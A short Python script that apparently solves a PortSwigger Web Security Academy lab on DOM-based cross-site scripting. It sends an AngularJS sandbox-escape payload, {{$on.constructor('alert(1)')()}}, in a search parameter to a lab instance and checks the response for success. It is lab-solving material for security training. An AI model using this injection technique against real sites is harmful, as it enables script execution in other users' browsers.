#https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression
from utils import *
url="https://0a1300580352f2218205ce4c00c80076.web-security-academy.net/"
payload="?search={{$on.constructor('alert(1)')()}}"
response=requests.get(url+payload)

print(check_succes(parse_html(response)))